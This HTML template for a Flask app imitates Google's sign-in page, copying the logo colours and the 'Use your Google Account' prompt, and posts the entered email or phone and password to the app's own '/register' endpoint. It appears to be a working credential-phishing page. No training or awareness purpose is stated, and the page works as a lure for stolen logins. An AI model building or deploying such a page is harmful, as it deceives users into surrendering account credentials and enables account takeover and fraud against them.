<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in â€“ Google</title>
    <link
      rel="icon"
      type="image/png"
      href="{{ url_for('static', filename='logo.png') }}"
    />

    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: "Roboto", Arial, sans-serif;
      }

      body {
        background-color: #f8f9fa;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .login-card {
        background: #fff;
        width: 380px;
        max-width: 90%;
        border-radius: 8px;
        padding: 40px 30px;
        box-shadow: 0 1px 6px rgba(0, 0, 0, 0.15);
        text-align: center;
      }

      .google-logo {
        font-size: 26px;
        font-weight: 500;
        margin-bottom: 10px;
      }

      .google-logo span:nth-child(1) {
        color: #4285f4;
      }
      .google-logo span:nth-child(2) {
        color: #ea4335;
      }
      .google-logo span:nth-child(3) {
        color: #fbbc05;
      }
      .google-logo span:nth-child(4) {
        color: #4285f4;
      }
      .google-logo span:nth-child(5) {
        color: #34a853;
      }
      .google-logo span:nth-child(6) {
        color: #ea4335;
      }

      h2 {
        font-size: 22px;
        font-weight: 400;
        margin: 15px 0 8px;
        color: #202124;
      }

      p.subtitle {
        font-size: 14px;
        color: #5f6368;
        margin-bottom: 30px;
      }

      input {
        width: 100%;
        padding: 14px;
        margin-bottom: 16px;
        font-size: 16px;
        border-radius: 4px;
        border: 1px solid #dadce0;
        outline: none;
      }

      input:focus {
        border-color: #1a73e8;
        box-shadow: 0 0 0 1px #1a73e8;
      }

      #warning {
        color: #d93025;
        font-size: 13px;
        text-align: left;
        margin-bottom: 10px;
      }

      .actions {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-top: 20px;
      }

      .link {
        font-size: 14px;
        color: #1a73e8;
        text-decoration: none;
        font-weight: 500;
      }

      .link:hover {
        text-decoration: underline;
      }

      button {
        background-color: #1a73e8;
        color: white;
        border: none;
        border-radius: 4px;
        padding: 10px 24px;
        font-size: 14px;
        cursor: pointer;
        font-weight: 500;
      }

      button:hover {
        background-color: #1669c1;
      }

      .footer {
        margin-top: 30px;
        font-size: 12px;
        color: #5f6368;
      }
    </style>
  </head>

  <body>
    <div class="login-card">
      <div class="google-logo">
        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span
        ><span>e</span>
      </div>

      <h2>Sign in</h2>
      <p class="subtitle">Use your Google Account</p>

      {% if message %}
      <p id="warning">{{ message }}</p>
      {% endif %}

      <form method="POST" action="/register">
        <input
          type="text"
          name="username"
          placeholder="Email or phone"
          required
        />
        <input
          type="password"
          name="password"
          placeholder="Enter your password"
          required
        />

        <div class="actions">
          <a href="#" class="link">Forgot email?</a>
          <button onclick="warning()" type="submit">Next</button>
        </div>
      </form>

      <div class="footer">
        <a href="#" class="link">Create account</a>
      </div>
    </div>

    <script>
      const warning1 = document.getElementById("warning");

      function warning() {
        if (warning1) {
          setTimeout(() => {
            warning1.style.display = "none";
          }, 3000);
        }
      }
    </script>
  </body>
</html>
